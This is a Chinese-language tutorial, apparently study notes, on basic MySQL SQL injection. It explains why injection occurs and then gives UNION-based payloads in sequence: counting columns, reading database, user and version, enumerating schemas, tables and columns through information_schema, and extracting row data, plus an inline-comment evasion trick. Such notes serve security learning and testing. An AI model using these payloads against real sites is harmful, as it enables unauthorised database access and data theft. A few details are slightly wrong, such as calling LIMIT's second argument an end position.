# SQL注入基础

## 介绍SQL注入
**SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作**

## SQL注入原理
***SQL注入漏洞产生需满足以下两个条件***
* 参数用户可控：前端传给后端的参数内容用户可以控制
* 参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询
* 例：`select * from users where	id=1`不符合数据库语法规范语
法
* 例：`select * from users where	id=1 and 1=1`因为1=1为真，故返回id=1相同结果

## MySQL与SQL注入漏洞相关知识点
**在MySQL5.0版本之后，MySQL默认在数据库中存放"information_schema"的数据库，在该库中需要记住三个表名，"SCHEMATA、TABLES和COLUMNS"**
1. `SCHEMATA表存放该用户创建的所有数据库库名，需要记住该表中记录数据库库名的字段名为SCHEMA_NAME`
1. `TABLES表中存放该用户创建所有数据库库名和表名，我们要记住记录数据库库名和表名的字段名为TABLE_SCHEMA和TABLE_NAME`
1. `COLUMNS表存放该用户创建的所有数据库库名、表名和字段名，对应的字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME`

### MySql查询语句
***在不知道任何条件时，语句如下***
1. **`SELECT 要查询的字段名 FROM 库名.表名`**
***在知道一条已知条件时，语句如下***
1. **`SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名='已知条件的值'`**
***在知道两条已知条件时，语句如下***
**`SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名='已知条件1的值' AND 已知条件2的字段名='已知条件2的值'`**

### limit用法
`select * from users limit n,m`
* PS： n为起始位置，m为结束位置

## 需要记住的几个函数
* database() : 当前网站使用的数据库
* version() : 当前MySQL版本
* user() : 当前MySQL用户

## 注释符
**在MySQL中，常见注释符的表达方式：#或--空格或/****

## 内联注释
**内联注释形式：/*! code*/**
* 例子:`index.php?id=-15 /*! UNION*//*! SELECT*/1, 2, 3`

## 查询字段
`select * from users where id=1 order by 5`
* 用来判断字段数，数字可变

## 在数据库中查询参数ID对于内容
`select * from users where	id=1 union select 1,2,3`

## union 查询数据库
###当查询到字段，根据字段可查询到database(), user(), version()
`select * from users where id=1 union select 1, database(), user()`
##获取所有的库名
`select * from users where id=-1 union select 1,group_concat(char(32,58,32),schema_name),3 from information_schema.schemata`

## 当得到表明
`select * from users where id=-1 union select 1, (select column_name from information_schema.columns where table_schema='sql'and table_name='emails' limit 0,1), 3`

## 获取表名
`select * from users where id=-1 union select 1,(select table_name from information_schema.tables where table_schema="family" limit 0,1),3`

## 查询字段名
`select * from users where	id=-1 union select 1,(select column_name from	information_schema.columns where table_schema="family" and table_name="family" limit 0,1),3`

## 查询对应数据
`select * from users where id=-1 union select 1,(select id from family.family limit 0,1),3`
